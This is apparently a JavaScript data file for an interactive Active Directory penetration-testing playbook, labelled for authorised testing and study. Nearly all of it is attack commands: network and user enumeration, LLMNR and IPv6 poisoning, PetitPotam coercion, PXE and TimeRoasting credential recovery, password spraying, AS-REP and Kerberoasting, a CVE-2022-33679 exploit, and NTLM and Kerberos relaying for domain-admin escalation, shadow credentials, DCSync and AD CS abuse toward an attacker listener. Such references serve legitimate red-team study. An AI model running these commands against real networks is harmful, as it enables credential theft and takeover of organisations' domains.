/*
  AD ATTACK PATH v2 — data for ad-map-v2.html

  A guided "playbook": colour-coded ACCESS SECTIONS you expand, each holding
  TECHNIQUE buttons you expand, each showing a Theory/CVE link, a short note,
  the commands, colour-coded OUTCOME badges, and "move to" pivots that jump to
  another (differently-coloured) section when your access changes.

  MODEL
    meta       title / version / note
    palette    named outcome colours (kept here so the scheme is consistent)
    sections[] {
      id, title, color(hex), tag, desc,
      techniques[] {
        id, title,
        theory : { label, url } | null,
        cve    : { id, label?, url? } | null,   // rendered as a CVE banner + chip
        desc   : "short note" | null,
        cmds   : [ "command", ... ],            // # comments are dimmed
        branches[] : {                          // optional nested sub-paths
          label, warn?(bool), cmds[], outcomes[]
        },
        outcomes[] : { label, color(hex) },     // colour-coded result badges
        moveTo[]   : { section, label?, note? }  // pivots to another section
      }
    }

  Extend the sections below — the page rebuilds itself automatically.
*/

var AD_MAP_V2 = {
  meta: {
    title: "AD Attack Path — Guided Playbook",
    version: "v2",
    note: "For authorised testing and study only. Click a section to expand it, then a technique for its commands."
  },

  // shared outcome palette (matches the section colours + result-box scheme)
  palette: {
    lavender:   "#cdc7e6",  // No Credentials
    blue:       "#3b9ee5",  // Valid user (Username)
    greenPale:  "#86efac",  // vulnerable host
    green:      "#4ade80",  // credentials obtained
    yellow:     "#ffe14a",  // poisoning / coerce
    orange:     "#e8912e"   // crackable hash
  },

  sections: [
    {
      id: "no-creds",
      title: "No Credentials",
      color: "#cdc7e6",
      tag: "Start here",
      desc: "You're on the network with no domain account yet — scan, find the domain, and hunt a first credential or hash.",
      techniques: [
        {
          id: "scan-network",
          title: "Scan network",
          theory: { label: "AD Fundamentals", url: "theory/2026-08-18-ad-fundamentals.html" },
          cve: null,
          desc: "Sweep the subnet and fingerprint hosts/services to find domain controllers and vulnerable targets.",
          cmds: [
            "nxc smb <ip_range>",
            "nmap -sP -p <ip>",
            "nmap -Pn -sV --top-ports 50 --open <ip>",
            "nmap -Pn --script smb-vuln* -p139,445 <ip>",
            "nmap -Pn -sC -sV -oA <output> <ip>",
            "nmap -Pn -sC -sV -p- -oA <output> <ip>",
            "nmap -sU -sC -sV -oA <output> <ip>"
          ],
          outcomes: [{ label: "Vulnerable host", color: "#86efac" }],
          moveTo: []
        },
        {
          id: "find-dc-ip",
          title: "Find DC IP",
          theory: { label: "AD Fundamentals", url: "theory/2026-08-18-ad-fundamentals.html" },
          cve: null,
          desc: "Identify the domain controllers via the local interface, DNS SRV records, and the Kerberos port.",
          cmds: [
            "nmcli dev show <interface>",
            "nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>",
            "nmap -p 88 --open <ip_range>"
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "zone-transfer",
          title: "Zone transfer",
          theory: { label: "AD Fundamentals", url: "theory/2026-08-18-ad-fundamentals.html" },
          cve: null,
          desc: "Attempt an AXFR to pull the whole DNS zone and map internal hostnames.",
          cmds: [
            "dig axfr <domain_name> @<name_server>"
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "anon-guest-smb",
          title: "Anonymous & Guest access on SMB shares",
          theory: { label: "LDAP and the AD Database", url: "theory/2026-08-18-ldap.html" },
          cve: null,
          desc: "Null and guest sessions can leak users, shares and policy with no credentials.",
          cmds: [
            "nxc smb <ip_range> -u '' -p ''",
            "nxc smb <ip_range> -u 'a' -p ''",
            "enum4linux-ng.py -a -u '' -p '' <ip>",
            "smbclient -U '%' -L //<ip>"
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "enum-ldap",
          title: "Enumerate LDAP",
          theory: { label: "LDAP and the AD Database", url: "theory/2026-08-18-ldap.html" },
          cve: null,
          desc: "Probe LDAP for anonymous binds and directory data.",
          cmds: [
            "nmap -n -sV --script 'ldap* and not brute' -p 389 <dc_ip>",
            "ldapsearch -x -H <dc_ip> -s base"
          ],
          outcomes: [],
          moveTo: [{ section: "valid-user", label: "Username", note: "once enumeration yields a usable account" }]
        },
        {
          id: "enum-users",
          title: "Enumerate Users",
          theory: { label: "LDAP and the AD Database", url: "theory/2026-08-18-ldap.html" },
          cve: null,
          desc: "RID-cycle and RPC-enumerate to build a username list.",
          cmds: [
            "nxc smb <dc_ip> --rid-brute 10000   # bruteforcing RID",
            "net rpc group members 'Domain Users' -W '<domain>' -l <ip> -U '%'"
          ],
          outcomes: [],
          moveTo: [{ section: "valid-user", label: "Username", note: "a valid username list feeds spraying / roasting" }]
        },
        {
          id: "bruteforce-users",
          title: "Bruteforce users",
          theory: { label: "Kerberos Authentication", url: "theory/2026-08-18-kerberos.html" },
          cve: null,
          desc: "Confirm which usernames exist via Kerberos pre-auth — no logon failure generated.",
          cmds: [
            "kerbrute userenum -d <domain> <userlist>",
            "nmap -p 88 --script=krb5-enum-users --script-args=\"krb5-enum-users.realm='<domain>',userdb=<user_list_file>\" <dc_ip>"
          ],
          outcomes: [],
          moveTo: [{ section: "valid-user", label: "Username", note: "confirmed usernames feed spraying / roasting" }]
        },
        {
          id: "poisoning",
          title: "Poisoning",
          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
          cve: null,
          desc: "Answer broadcast name-resolution or MITM the segment to capture / relay authentication.",
          cmds: [],
          branches: [
            { label: "LLMNR / NBT-NS / mDNS", cmds: ["responder -I <interface>"] },
            { label: "DHCPv6 (IPv6 preferred to IPv4)", warn: true, cmds: ["mitm6 -d <domain>", "bettercap"] },
            { label: "ARP Poisoning", warn: true, cmds: ["bettercap"] },
            { label: "AS-REQ roast (via poisoning)", cmds: ["Pcredz -i <interface> -v"], outcomes: [{ label: "Hash found ASREQ", color: "#e8912e" }] }
          ],
          outcomes: [
            { label: "poisoning SMB", color: "#ffe14a" },
            { label: "poisoning LDAP", color: "#ffe14a" },
            { label: "poisoning HTTP", color: "#ffe14a" }
          ],
          moveTo: [{ section: "mitm", label: "Listen & Relay", note: "captured SMB/LDAP/HTTP auth can be relayed to a service that accepts it" }]
        },
        {
          id: "coerce",
          title: "Coerce",
          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
          cve: { id: "CVE-2022-26925", label: "Unauthenticated PetitPotam", url: "https://nvd.nist.gov/vuln/detail/CVE-2022-26925" },
          desc: "Force a host (often a DC) to authenticate to your listener so it can be relayed.",
          cmds: [
            "petitpotam.py -d <domain> <listener> <target>"
          ],
          outcomes: [{ label: "Coerce SMB", color: "#ffe14a" }],
          moveTo: [{ section: "mitm", label: "Listen & Relay", note: "the coerced authentication is relayed to LDAP(S)/HTTP/SMB" }]
        },
        {
          id: "pxe",
          title: "PXE",
          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
          cve: null,
          desc: "Pull SCCM PXE boot media to recover deployment credentials — no domain account needed.",
          cmds: [],
          branches: [
            { label: "no password", cmds: ["pxethief.py 1", "pxethief.py 2 <distribution_point_ip>"], outcomes: [{ label: "Credentials (NAA account)", color: "#4ade80" }] },
            { label: "password protected", cmds: ["tftp -i <dp_ip> GET \"\\xxx\\boot.var\"", "pxethief.py 5 \"\\xxx\\boot.var\""], outcomes: [{ label: "PXE Hash", color: "#e8912e" }] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "timeroasting",
          title: "TimeRoasting",
          theory: { label: "Kerberos Authentication", url: "theory/2026-08-18-kerberos.html" },
          cve: null,
          desc: "Abuse MS-SNTP to recover computer-account hashes with no authentication, to crack offline.",
          cmds: [
            "timeroast.py <dc_ip> -o <output_log>"
          ],
          outcomes: [{ label: "timeroast hash", color: "#e8912e" }],
          moveTo: []
        }
      ]
    },

    {
      id: "valid-user",
      title: "Valid user (no password)",
      color: "#3b9ee5",
      tag: "Have a username",
      desc: "You hold at least one valid username (and maybe a password) — spray for credentials and roast pre-auth-disabled accounts.",
      techniques: [
        {
          id: "pw-spray",
          title: "Password Spray",
          theory: { label: "Kerberos Authentication", url: "theory/2026-08-18-kerberos.html" },
          cve: null,
          desc: "Try one password across many users. Read the lockout policy FIRST so you don't lock accounts.",
          cmds: [],
          branches: [
            { label: "Get password policy — default policy", note: "You need creds, but get the policy first to avoid locking accounts.", cmds: [
              "nxc smb <dc_ip> -u '<user>' -p '<password>' --pass-pol",
              "Get-ADDefaultDomainPasswordPolicy",
              "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> domain_policy"
            ] },
            { label: "Get password policy — Fine-Grained (privileged)", cmds: [
              "ldapsearch-ad.py --server <dc> -d <domain> -u <user> -p <pass> --type pass-pols",
              "Get-ADFineGrainedPasswordPolicy -filter *",
              "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> pso   # runs as low-priv too, with less info"
            ] },
            { label: "user == password", warn: true, cmds: [
              "nxc smb <dc_ip> -u <users.txt> -p <passwords.txt> --no-bruteforce --continue-on-success",
              "sprayhound -U <users.txt> -d <domain> -dc <dc_ip>   # --lower / --upper to case-fold; nothing = user==pass"
            ], outcomes: [{ label: "Clear text Credentials", color: "#4ade80" }] },
            { label: "Usual passwords (Season+Year!, Company123 …)", warn: true, cmds: [
              "nxc smb <dc_ip> -u <users.txt> -p <password> --continue-on-success",
              "sprayhound -U <users.txt> -p <password> -d <domain> -dc <dc_ip>",
              "kerbrute passwordspray -d <domain> <users.txt> <password>"
            ], outcomes: [{ label: "Clear text Credentials", color: "#4ade80" }] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "asreproast",
          title: "ASREPRoast",
          theory: { label: "AS-REP Roasting", url: "theory/2026-08-18-asrep-roasting.html" },
          cve: null,
          desc: "Accounts with Kerberos pre-auth disabled (and SPN-write via a pre-auth account) yield crackable tickets.",
          cmds: [],
          branches: [
            { label: "List ASREPRoastable users (need creds)", cmds: [
              "MATCH (u:User) WHERE u.dontreqpreauth = true AND u.enabled = true RETURN u   # BloodHound / Cypher"
            ] },
            { label: "ASREP roasting", cmds: [
              "GetNPUsers.py <domain>/ -usersfile <users.txt> -format hashcat -outputfile <output.txt>",
              "nxc ldap <dc_ip> -u <users.txt> -p '' --asreproast <output.txt>",
              "Rubeus.exe asreproast /format:hashcat"
            ], outcomes: [{ label: "Hash found ASREP", color: "#e8912e" }] },
            { label: "Blind Kerberoasting", cmds: [
              "Rubeus.exe kerberoast /domain:<domain> /dc:<dcip> /nopreauth:<asrep_user> /spns:<users.txt>",
              "GetUserSPNs.py -no-preauth \"<asrep_user>\" -usersfile \"<user_list.txt>\" -dc-host \"<dc_ip>\" \"<domain>/\""
            ], outcomes: [{ label: "Hash found TGS", color: "#e8912e" }] },
            { label: "Kerberos RC4 downgrade", cve: "CVE-2022-33679", cmds: [
              "CVE-2022-33679.py <domain>/<user> <target>"
            ], outcomes: [{ label: "Lat move PTT", color: "#9ca3af" }] }
          ],
          outcomes: [],
          moveTo: []
        }
      ]
    },

    {
      id: "mitm",
      title: "Man In The Middle (Listen and Relay)",
      color: "#ffe14a",
      tag: "Poison & relay",
      desc: "Capture authentication on the wire and relay it to a service that will accept it.",
      techniques: [
        {
          id: "listen",
          title: "Listen",
          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
          cve: null,
          desc: "Answer name resolution / capture SMB authentication to obtain hashes or credentials.",
          cmds: [
            "responder -I <interface>   # use --lm to force a downgrade",
            "smbclient.py"
          ],
          outcomes: [
            { label: "Hash NTLMv1 or NTLMv2", color: "#e8912e" },
            { label: "Username", color: "#3b9ee5" },
            { label: "Credentials (ldap/http)", color: "#4ade80" }
          ],
          moveTo: []
        },
        {
          id: "ntlm-relay",
          title: "NTLM relay",
          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
          cve: null,
          desc: "Relay captured/coerced NTLM authentication to a service, picking the target by what's unsigned/unenforced.",
          cmds: [],
          branches: [
            { label: "MS08-068 self relay", cmds: ["msf> exploit/windows/smb/smb_relay   # Windows 2000 / Server 2008"] },
            { label: "SMB → LDAP(S)", cve: "CVE-2019-1040", note: "NTLMv1: remove MIC (no CVE needed). NTLMv2: remove MIC (CVE-2019-1040).", outcomes: [{ label: "see LDAP(S)", color: "#ffe14a" }] },
            { label: "HTTP(S) → LDAP(S)", note: "Usually from a WebDAV coercion — HTTP auth relays cross-protocol.", outcomes: [{ label: "see LDAP(S)", color: "#ffe14a" }] },
            { label: "To LDAP(S) → RBCD", note: "Relay to LDAP when LDAP signing and LDAPS channel binding aren't enforced (the default).", cmds: [
              "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --add-computer <computer_name> <computer_password> --delegate-access"
            ], outcomes: [{ label: "RBCD", color: "#10b981" }] },
            { label: "To LDAP(S) → Shadow Credentials", cmds: [
              "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --shadow-credentials --shadow-target '<dc_name$>'"
            ], outcomes: [{ label: "Shadow Credentials", color: "#9ca3af" }] },
            { label: "To LDAP(S) → Domain Admin", cmds: [
              "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --escalate-user <user>"
            ], outcomes: [{ label: "Domain admin", color: "#ef4444" }] },
            { label: "To LDAP(S) → LDAP shell", cmds: [
              "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --interactive   # nc 127.0.0.1 10111"
            ], outcomes: [{ label: "LDAP SHELL", color: "#9ca3af" }] },
            { label: "To SMB (SMB not signed)", note: "Find unsigned targets (default on non-DCs), then relay.", cmds: [
              "nxc smb <ip_range> --gen-relay-list smb_unsigned_ips.txt",
              "ntlmrelayx.py -tf smb_unsigned_ips.txt -smb2support [--ipv6] -socks"
            ], outcomes: [{ label: "SMB Socks", color: "#9ca3af" }] },
            { label: "To HTTP → AD CS (ESC8)", note: "Relay to the CA web enrollment endpoint.", outcomes: [{ label: "ESC8", color: "#a855f7" }] },
            { label: "To HTTP → WSUS", note: "Relay to WSUS.", outcomes: [{ label: "WSUS", color: "#9ca3af" }] },
            { label: "To MSSQL", cmds: ["ntlmrelayx.py -t mssql://<ip> [-smb2support] -socks"], outcomes: [{ label: "MSSQL Socks", color: "#9ca3af" }] },
            { label: "SMB → NETLOGON (Zerologon)", cve: "CVE-2020-1472", note: "Zero-Logon (safe method) — relay one DC to another.", cmds: [
              "ntlmrelayx.py -t dcsync://<dc_to_ip> -smb2support -auth-smb <user>:<password>"
            ], outcomes: [{ label: "DCSYNC", color: "#3b82f6" }] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "kerberos-relay",
          title: "Kerberos relay",
          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
          cve: null,
          desc: "Relay Kerberos instead of NTLM (krbrelayx) — useful where NTLM is blocked but you can coerce Kerberos.",
          cmds: [],
          branches: [
            { label: "To HTTP → AD CS (ESC8)", cmds: [
              "krbrelayx.py -t 'http://<pki>/certsrv/certfnsh.asp' --adcs --template DomainController -v '<target_netbios>$' -ip <attacker_ip>"
            ], outcomes: [{ label: "ESC8", color: "#a855f7" }] },
            { label: "SMB → SMB", note: "Same as NTLM relay — use krbrelayx.py." },
            { label: "SMB → LDAP(S)", note: "Same as NTLM relay — use krbrelayx.py." }
          ],
          outcomes: [],
          moveTo: []
        }
      ]
    }
  ]
};
